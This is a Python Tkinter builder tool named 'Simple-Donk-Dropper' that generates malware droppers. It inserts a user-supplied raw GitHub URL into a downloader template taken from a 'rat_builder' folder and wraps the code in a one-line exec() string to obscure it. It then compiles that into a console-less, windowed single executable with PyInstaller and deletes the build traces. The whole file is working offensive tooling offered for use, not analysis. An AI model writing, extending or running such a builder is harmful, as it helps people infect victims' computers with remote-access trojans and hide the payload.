import os
import subprocess
import tkinter as tk
import shutil
import json
import sys
# Setup folders
base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
build_dir = os.path.join(base_dir, "build")
os.makedirs(build_dir, exist_ok=True)

# Source and destination files
source_file = os.path.join(base_dir, "rat_builder", "file_download.py")
modified_file = os.path.join(build_dir, "dropthis.py")

def builder():
    try:
        # Get the URL from the text box
        raw_url = text_box.get("1.0", tk.END).strip()

        # Copy source to modified file
        shutil.copy(source_file, modified_file)

        # Replace placeholder in the code
        with open(modified_file, "r", encoding="utf-8") as file:
            code = file.read()
        code = code.replace("REPLACE_ME_URL", raw_url)

        # Convert to one-line exec code
        one_line = "; ".join(line.strip() for line in code.splitlines() if line.strip())
        placeholder = f"exec({json.dumps(one_line)})"

        # Overwrite modified file with the one-liner
        with open(modified_file, "w", encoding="utf-8") as file:
            file.write(placeholder)

        # Build exe using PyInstaller directly into build folder, no console, no spec
        subprocess.run([
            "pyinstaller",
            "--noconfirm",
            "--onefile",
            "--windowed",
            "--distpath", build_dir,
            "--workpath", os.path.join(build_dir, "temp_build"),
            "--specpath", build_dir,
            modified_file
        ])

        # Remove temporary Python file
        os.remove(modified_file)

        # Remove the .spec file
        spec_file = os.path.join(build_dir, "dropthis.spec")
        if os.path.exists(spec_file):
            os.remove(spec_file)

        # Remove temporary build folder
        temp_build = os.path.join(build_dir, "temp_build")
        if os.path.exists(temp_build):
            shutil.rmtree(temp_build)

        # Open the build folder
        subprocess.run(["explorer", build_dir])

    except Exception as e:
        print(f"An error has occurred: {e}")

# GUI setup
root = tk.Tk()
root.title("Simple-Donk-Dropper")

button = tk.Button(root, text="Build", command=builder)
button.pack(pady=5)

text1 = tk.Label(root, text="Enter the raw GitHub URL below:")
text1.pack()

text_box = tk.Text(root, height=5, width=50)
text_box.pack(pady=10)

root.mainloop()
